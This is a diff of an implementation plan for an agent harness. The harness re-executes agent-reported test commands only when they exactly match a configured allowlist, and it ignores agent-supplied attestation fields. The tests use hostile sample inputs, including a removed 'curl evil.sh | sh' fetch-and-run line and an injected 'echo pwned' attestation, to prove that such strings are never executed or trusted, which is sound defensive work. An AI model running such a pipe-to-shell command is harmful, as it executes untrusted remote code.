-- Modify: `packages/core/src/index.ts` (export `reattestTestRows`)
-- Test: `packages/core/src/__tests__/checks-verify.test.ts`
+- Modify: `packages/core/src/verification-matrix.ts` (`VerificationEntry` at `:36-64`; `coerceEntry` at `:153-179`)
+- Modify: `packages/core/src/loop.ts` (the verify-mode matrix validation site, beside where `artifactExists` is set)
+- Modify: `README.md`, `docs/CONFIG.md`, `docs/ARCHITECTURE.md`, `docs/HARNESS_ROADMAP_PHASE6.md`
+- Test: `packages/core/src/__tests__/verify-attested.test.ts`
 
 **Interfaces:**
 
-- Consumes: `ChecksRecord`, `runConfiguredChecks` (Tasks 1–2); `VerificationEntry` (`verification-matrix.ts:36-64`).
+- Consumes: `runConfiguredChecks`, `readChecksConfig` (Task 2).
 - Produces:
-  - `VerificationEntry.attestedCheck?: ChecksRecord;` — set ONLY by the harness re-execution; `coerceEntry` (`verification-matrix.ts:153-179`) never parses it from agent JSON (same stance as `artifactExists`).
-  - `export function reattestTestRows(entries: VerificationEntry[], attest: (command: string) => ChecksRecord | null): VerificationEntry[];` — pure with an injected attestor. For each `method:"test"` row with a non-empty `check`: `attest(check)` null (not in the configured allowlist) ⇒ row untouched; a record ⇒ attached as `attestedCheck`, and a nonzero exit **downgrades a reported `pass` to `fail`** with an explanatory note. Coverage counting (`hasArtifact`) is intentionally unchanged — attestation corrects _results_, artifact citations still earn _coverage_.
+  - `VerificationEntry.attestedCheck?: { command: string; exitCode: number; durationMs: number };` — harness-only, never read from agent JSON (`coerceEntry` must strip it, exactly like `artifactExists`).
+  - `export function attestMatrixRows(entries, commands, cwd, run?, policy?): VerificationEntry[];` — re-executes only rows whose `method === "test"` and whose **`check`** field (documented as "the concrete check: the command run", `verification-matrix.ts:40`) **exactly matches** a configured check. Non-matching rows are left untouched (a coverage gap, not a failure).
+
+> **Field note:** the command lives in `VerificationEntry.check`, **not** in
+> `artifactPath` — `artifactPath` is a `file:line`/SHA/screenshot pointer. Matching
+> against `artifactPath` would never fire.
 
 - [ ] **Step 1: Write the failing test**
 
 ```ts
-// packages/core/src/__tests__/checks-verify.test.ts
+// packages/core/src/__tests__/verify-attested.test.ts
 import { describe, it, expect } from "vitest";
 import {
-  reattestTestRows,
+  attestMatrixRows,
+  parseVerificationMatrix,
   type VerificationEntry,
 } from "../verification-matrix.js";
-import type { ChecksRecord } from "../checks.js";
+import { DEFAULT_POLICY } from "../safety-policy.js";
+import type { CheckCommandRunner } from "../checks.js";
 
-const failing: ChecksRecord = {
-  command: "pnpm -r test",
-  exitCode: 1,
-  durationMs: 5000,
-  outputTail: "FAIL src/b.test.ts > adds\n",
-  failureSignature: "FAIL src/b.test.ts > adds",
-  attestedAt: "2026-07-10T00:00:00.000Z",
-};
-const passing: ChecksRecord = {
-  ...failing,
-  exitCode: 0,
-  failureSignature: null,
-};
+const green: CheckCommandRunner = () => ({ status: 0, output: "ok\n" });
+const red: CheckCommandRunner = () => ({ status: 1, output: "FAIL x\n" });
 
-const row = (over: Partial<VerificationEntry>): VerificationEntry => ({
-  requirement: "suite passes",
+/** `check` carries the command; `artifactPath` is a pointer, never a command. */
+const row = (over: Partial<VerificationEntry> = {}): VerificationEntry => ({
+  requirement: "adds two numbers",
   method: "test",
-  check: "pnpm -r test",
   result: "pass",
-  confidence: "high",
+  check: "pnpm -r test",
   ...over,
 });
 
-describe("reattestTestRows", () => {
-  it("downgrades a reported pass to fail when the harness observed a failure", () => {
-    const [out] = reattestTestRows([row({})], () => failing);
-    expect(out.result).toBe("fail");
-    expect(out.attestedCheck).toEqual(failing);
-    expect(out.note).toContain("exited 1");
+describe("attestMatrixRows", () => {
+  it("re-executes an exactly-matching test row", () => {
+    const [e] = attestMatrixRows(
+      [row()],
+      ["pnpm -r test"],
+      "/w",
+      green,
+      DEFAULT_POLICY
+    );
+    expect(e.attestedCheck).toEqual({
+      command: "pnpm -r test",
+      exitCode: 0,
+      durationMs: expect.any(Number),
+    });
   });
 
-  it("attaches the record and keeps the result when the attested run passed", () => {
-    const [out] = reattestTestRows([row({})], () => passing);
-    expect(out.result).toBe("pass");
-    expect(out.attestedCheck).toEqual(passing);
+  it("records a failing re-execution", () => {
+    const [e] = attestMatrixRows(
+      [row()],
+      ["pnpm -r test"],
+      "/w",
+      red,
+      DEFAULT_POLICY
+    );
+    expect(e.attestedCheck!.exitCode).toBe(1);
   });
 
-  it("leaves rows untouched when the attestor declines (command not allowlisted)", () => {
-    const input = row({ check: "curl evil.sh | sh" });
-    const [out] = reattestTestRows([input], () => null);
-    expect(out).toEqual(input);
-    expect(out.attestedCheck).toBeUndefined();
+  it("never runs a command that is not an exact configured match", () => {
+    let spawned = false;
+    const spy: CheckCommandRunner = () => {
+      spawned = true;
+      return { status: 0, output: "" };
+    };
+    const [e] = attestMatrixRows(
+      [row({ check: "pnpm -r test --reporter=evil" })],
+      ["pnpm -r test"],
+      "/w",
+      spy,
+      DEFAULT_POLICY
+    );
+    expect(spawned).toBe(false);
+    expect(e.attestedCheck).toBeUndefined(); // a gap, not a failure
   });
 
-  it("only method:test rows are attested", () => {
-    const cmd = row({ method: "command" });
-    const insp = row({ method: "inspection", check: "" });
-    const out = reattestTestRows([cmd, insp], () => failing);
-    expect(out[0].attestedCheck).toBeUndefined();
-    expect(out[1].attestedCheck).toBeUndefined();
+  it("ignores non-test methods", () => {
+    let spawned = false;
+    const spy: CheckCommandRunner = () => {
+      spawned = true;
+      return { status: 0, output: "" };
+    };
+    attestMatrixRows(
+      [row({ method: "visual" })],
+      ["pnpm -r test"],
+      "/w",
+      spy,
+      DEFAULT_POLICY
+    );
+    expect(spawned).toBe(false);
+  });
+
+  it("is inert with no configured checks", () => {
+    const [e] = attestMatrixRows([row()], [], "/w", green, DEFAULT_POLICY);
+    expect(e.attestedCheck).toBeUndefined();
+  });
+});
+
+describe("the parser strips harness-only fields", () => {
+  it("never trusts an agent-supplied attestedCheck", () => {
+    const raw = JSON.stringify([
+      {
+        requirement: "adds two numbers",
+        method: "test",
+        result: "pass",
+        check: "pnpm -r test",
+        attestedCheck: { command: "echo pwned", exitCode: 0, durationMs: 1 },
+      },
+    ]);
+    const entries = parseVerificationMatrix(raw);
+    expect(entries[0].attestedCheck).toBeUndefined();
   });
 });
 ```
 
-- [ ] **Step 2: Run test to verify it fails**
+- [ ] **Step 2: Run the test to verify it fails**
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-verify`
-Expected: FAIL — `reattestTestRows` not exported.
+Run: `pnpm --filter @phamvuhoang/otto-core test -- verify-attested`
+Expected: FAIL — `attestMatrixRows` is not exported.
 
-- [ ] **Step 3: Implement + wire the finalize verify branch**
+- [ ] **Step 3: Write the implementation**
 
-In `verification-matrix.ts` — `import type { ChecksRecord } from "./checks.js";`, add to `VerificationEntry` (after `beforeBundled`):
+In `packages/core/src/verification-matrix.ts`, add to `VerificationEntry` (`:36-64`):
 
 ```ts
-  /** Set ONLY by the harness's P27 re-execution of this row's check command
-   *  (never parsed from agent JSON — same stance as `artifactExists`). Present
-   *  ⇒ the result column reflects an execution Otto itself observed. */
-  attestedCheck?: ChecksRecord;
+  /** Set by the loop when a `method:"test"` row's cited command exactly matched
+   *  a configured check and the harness re-executed it (P27). Absent ⇒ the row
+   *  was not re-executed (a coverage gap, never a failure). Never read from
+   *  agent JSON — `coerceEntry` strips it. */
+  attestedCheck?: { command: string; exitCode: number; durationMs: number };
 ```
 
-and the pure re-attestor:
+In `coerceEntry` (`:153-179`), ensure the returned object never copies `attestedCheck` from input — it builds a fresh object from validated fields, so simply do **not** add it there. The test above pins this.
+
+Then add the re-execution helper:
 
 ```ts
+import { runConfiguredChecks, type CheckCommandRunner } from "./checks.js";
+import { DEFAULT_POLICY, type SafetyPolicy } from "./safety-policy.js";
+
 /**
- * Re-execute `method:"test"` rows through an injected attestor (P27): the
- * caller's attestor returns a ChecksRecord only for commands it is willing to
- * run (the loop allows exactly the `.otto/config.json` `checks` entries, so an
- * agent-emitted command string is never executed verbatim). An attested
- * failure overrides a reported `pass` — execution truth beats prose. Pure.
+ * Re-execute `method:"test"` rows in `--verify` mode so a "pass" is something
+ * the harness watched rather than something the agent asserted.
+ *
+ * Exact-match-only against the configured allowlist: matrix rows are
+ * agent-emitted strings, and a fuzzy match would hand an untrusted string to a
+ * shell. A non-matching row is a coverage gap, not a failure.
  */
-export function reattestTestRows(
+export function attestMatrixRows(
   entries: VerificationEntry[],
-  attest: (command: string) => ChecksRecord | null
+  commands: string[],
+  cwd: string,
+  run?: CheckCommandRunner,
+  policy: SafetyPolicy = DEFAULT_POLICY
 ): VerificationEntry[] {
+  if (commands.length === 0) return entries;
   return entries.map((e) => {
-    if (e.method !== "test" || !e.check.trim()) return e;
-    const record = attest(e.check.trim());
-    if (!record) return e;
-    const next: VerificationEntry = { ...e, attestedCheck: record };
-    if (record.exitCode !== 0 && e.result === "pass") {
-      next.result = "fail";
-      next.note = [
-        e.note,
-        `attested: \`${record.command}\` exited ${record.exitCode} — harness re-execution overrides the reported pass`,
-      ]
-        .filter(Boolean)
-        .join(" — ");
-    }
-    return next;
+    if (e.method !== "test") return e;
+    const cited = e.check.trim(); // `check` is the command; artifactPath is a pointer
+    if (!commands.includes(cited)) return e;
+    const [rec] = runConfiguredChecks([cited], cwd, undefined, run, policy);
+    if (!rec) return e;
+    return {
+      ...e,
+      attestedCheck: {
+        command: rec.command,
+        exitCode: rec.exitCode,
+        durationMs: rec.durationMs,
+      },
+    };
   });
 }
 ```
 
-In `loop.ts` `finalizeManifest`, immediately after the `validateVerificationEvidence` call inside the verify branch (`:826-831`) and before `manifestForReport` is built:
+Wire it in `loop.ts` in verify mode, immediately after the existing `artifactExists` validation pass:
 
 ```ts
-// P27: re-execute method:"test" rows whose check command exactly matches
-// a configured `checks` entry — execution truth instead of existence-only
-// artifact checking. Agent-emitted commands outside the repo-authored
-// allowlist are never run. Records join the run aggregate so the
-// checksSummary (and the report's Attested Checks section) include them.
-if (verification && checksCommands.length > 0) {
-  const allowed = new Set(checksCommands);
-  const policy = readSafetyPolicy(workspaceDir);
-  verification = reattestTestRows(verification, (cmd) => {
-    if (!allowed.has(cmd)) return null;
-    const [record] = runConfiguredChecks(
-      [cmd],
-      workspaceDir,
-      undefined,
-      undefined,
-      policy
-    );
-    runChecksRecords.push(record);
-    return record;
-  });
-}
+verification = attestMatrixRows(verification, checkCommands, workspaceDir);
 ```
 
-(`reattestTestRows` joins the existing `parseVerificationMatrixWithDiagnostics` import from `./verification-matrix.js`.)
+- [ ] **Step 4: Run the tests to verify they pass**
 
-- [ ] **Step 4: Run test to verify it passes**
+Run: `pnpm --filter @phamvuhoang/otto-core test -- verify-attested`
+Expected: PASS (6 tests).
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-verify`
-Expected: PASS (4 tests). Also run `pnpm --filter @phamvuhoang/otto-core test -- verification` — existing matrix/evidence tests unchanged (`attestedCheck` is optional and never parsed).
+- [ ] **Step 5: Update the docs**
 
-- [ ] **Step 5: Typecheck + commit**
+- `docs/CONFIG.md` — document the `checks` key: a string array of shell commands, run in order, fail-fast; absent ⇒ inert.
+- `README.md` — an "Attested checks" subsection with the three sentences that matter: (1) the harness runs these itself after every review-path fix commit and records exit code/duration/output tail — agent claims are attested, not trusted; (2) a **terminal** failing check overrides the exit reason and eval `succeeded`, while a failure a later iteration fixed does not; (3) no `checks` key ⇒ zero behavior change.
+- `docs/ARCHITECTURE.md` — the attestation boundaries, the two-module split, and where the evidence lands: stage records → manifest `checksSummary` → report "Attested Checks" → `otto-inspect` → eval `succeeded`.
+- `docs/HARNESS_ROADMAP_PHASE6.md` — mark P27 shipped in the status note and the priority table.
+
+- [ ] **Step 6: Full verify and commit**
 
 ```bash
-pnpm -r typecheck
-git add packages/core/src/verification-matrix.ts packages/core/src/loop.ts packages/core/src/index.ts packages/core/src/__tests__/checks-verify.test.ts
-git commit -m "feat(p27): re-execute allowlisted method:test matrix rows under --verify"
+pnpm -r typecheck && pnpm -r test && pnpm test
+git add -A
+git commit -m "feat(p27): verify-mode matrix re-execution + docs"
 ```
 
 ---
 
-### Task 8: Docs + roadmap status + full verify
+## Refresh notes (2026-07-29)
 
-**Files:**
+**Design changes** adopted from the approved spec, which this plan's 2026-07-10 revision predated:
 
-- Modify: `README.md` (document the `checks` config key next to the other `.otto/config.json` keys, with the disagreement/inertness semantics and a copy-paste example)
-- Modify: `docs/ARCHITECTURE.md` (attestation boundaries, the shared `ChecksRecord` contract, and where the evidence lands: stage records → manifest `checksSummary` → report "Attested Checks" → `otto-inspect` → eval `succeeded`)
-- Modify: `CLAUDE.md` (add a row/note in the key-systems table cell for Evidence & reports mentioning attested checks, matching the existing one-cell style)
-- Modify: `docs/HARNESS_ROADMAP_PHASE6.md` (status blockquote at `:4-6`: note the P27 first slice has landed)
+1. **`succeeded` is terminal, not cumulative.** Was `checksSummary.failed === 0`, which scored a run whose iteration-2 failure was fixed by iteration 5 as a failure. Now `terminalFailed === 0`, with `everFailed` retained as churn evidence. Task 8 adds the recovery fixture that pins this.
+2. **`summarizeChecks` takes `configuredCount`** so fail-fast short-circuiting surfaces as `skipped` instead of reading as a passing suite.
+3. **Fail-fast within a boundary** (new Task 2 behavior) — the ladder stops at the first non-zero exit, including a policy block.
+4. **Terminal red gets its own exit reason** (new Task 6), overriding only success reasons so `stopped (budget)` stays legible. Named `"done with failing checks"` — a sentence, matching the existing `NEXT_ACTION` keys — **not** the kebab-case `checks-failed` the spec sketched.
+5. **Two-module split** — orchestration moved out of `loop.ts` into `attestation.ts` (new Task 3), because the terminal-state rule is stateful.
+6. **One wiring point, not two.** Panel synth attestation needs no new `panel.ts` hook: `panel.ts` already calls the loop's `recordStage` closure for the synth substage, so hooking that closure covers both the single reviewer and the panel synth.
 
-**Interfaces:** none (docs only).
+**Anchor corrections** — verified against `main` at `8e33d17`:
 
-- [ ] **Step 1: Write the docs**
+| Cited in the old plan                   | Actual on `main`                                              |
+| --------------------------------------- | ------------------------------------------------------------- |
+| `run-report.ts:114-142` (`StageRecord`) | `run-report.ts:148`                                           |
+| `run-report.ts:150-191` (`RunManifest`) | `run-report.ts:225`; `inputSharpness` at `:253`               |
+| `inspect.ts:76-81` (sharpness block)    | `inspect.ts:143-148`                                          |
+| `inspect.ts:96-100` (skills lines)      | `inspect.ts:163-167`                                          |
+| `bench.ts:193-219` (`runFixtureChecks`) | `bench.ts:210`; `CheckRunner` type is at `:193-196`           |
+| `loop.ts:810-865` (stage-record write)  | `recordStage` closure at `:775`; record literal at `:800-815` |
 
-README example to include verbatim:
-
-```json
-// .otto/config.json
-{
-  "checks": ["pnpm -r typecheck", "pnpm -r test"]
-}
-```
-
-with the three sentences that matter: (1) the harness runs these itself after every review-path fix commit and records exit code/duration/output tail — agent claims are attested, not trusted; (2) a failing attested check overrides the report verdict and eval `succeeded`; (3) no `checks` key ⇒ zero behavior change.
-
-- [ ] **Step 2: Full verify**
-
-Run: `pnpm -r typecheck && pnpm -r test && pnpm test`
-Expected: all PASS.
-
-- [ ] **Step 3: Commit**
-
-```bash
-git add README.md docs/ARCHITECTURE.md CLAUDE.md docs/HARNESS_ROADMAP_PHASE6.md
-git commit -m "docs(p27): document attested checks config, boundaries, and evidence flow"
-```
-
----
-
-## Self-Review Notes
-
-- **Spec coverage:** config contract + inertness (T2), pure checks core / shared contract (T1), policy-scoped runner with truncation (T2), evidence shapes + `otto-inspect` (T3), attestation boundaries — single reviewer, panel synth, apply-review (T4), disagreement surfacing in the report verdict (T5), eval truth signal + disagreement fixture (T6), `--verify` `method:"test"` re-execution (T7), docs + roadmap status (T8). All nine spec scope bullets map to a task.
-- **Roadmap sequencing honored:** T4 lands the "one boundary first" slice (reviewer + synth + apply-review share one predicate/closure, so they land together at negligible marginal cost); T7 is the `--verify` extension; P28's `deriveProgress` wiring is intentionally NOT planned (spec out-of-scope — it consumes these records in its own initiative).
-- **Shared contract fidelity:** `ChecksRecord`, `extractFailureSignature`, `summarizeChecks`, `runConfiguredChecks(commands, cwd, timeoutMs?)`, `StageRecord.checks?`, `RunManifest.checksSummary?` ship exactly as specced. `runConfiguredChecks` adds trailing optional injection params (runner/policy/clock) — the same seam `bench.ts` `runFixtureChecks` uses — which leaves the specced call shape valid verbatim.
-- **Inertness proof:** every seam gates on `checksCommands.length > 0` / `manifest.checksSummary` presence; T3–T6 each carry an explicit "absent ⇒ unchanged" test, and T4 Step 4 re-runs the full existing suite as the no-config regression check.
-- **Type consistency:** `ChecksRecord` defined once in T1 (`checks.ts`) and imported by `run-report.ts` (T3), `panel.ts`/`loop.ts` (T4), `verification-matrix.ts` (T7) — one-directional imports, no cycles (`checks.ts` depends only on `render.js` + `safety-policy.js`).
+Still accurate and reused unchanged: `render.ts:60` (`resolveShell`), `safety-policy.ts:104` (`checkCommand`), `git.ts:44` (`headSha`), `skill-activation.ts:49` (`readSkillsConfig`), `report-finalize.ts:30-36` (`FinalizeReportContext`), `verification-matrix.ts:36-64` / `:49-53` / `:153-179`.
